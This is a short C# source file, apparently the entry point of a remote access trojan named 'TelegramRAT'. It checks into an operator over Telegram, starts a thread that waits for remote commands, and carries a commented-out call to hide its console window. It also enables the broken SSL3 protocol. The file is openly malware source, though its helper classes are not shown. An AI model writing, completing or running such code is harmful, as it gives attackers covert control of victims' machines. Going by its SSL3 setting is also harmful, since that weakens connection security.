using System;

namespace TelegramRAT
{
    class Program
    {
        [STAThreadAttribute]
        static void Main(string[] args)
        {

            //persistence.HideConsoleWindow();

            // SSL
            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Ssl3 | System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;

            telegram.sendConnection();
            // Wait for new commands
            telegram.waitCommandsThread.Start();


        }
    }
}
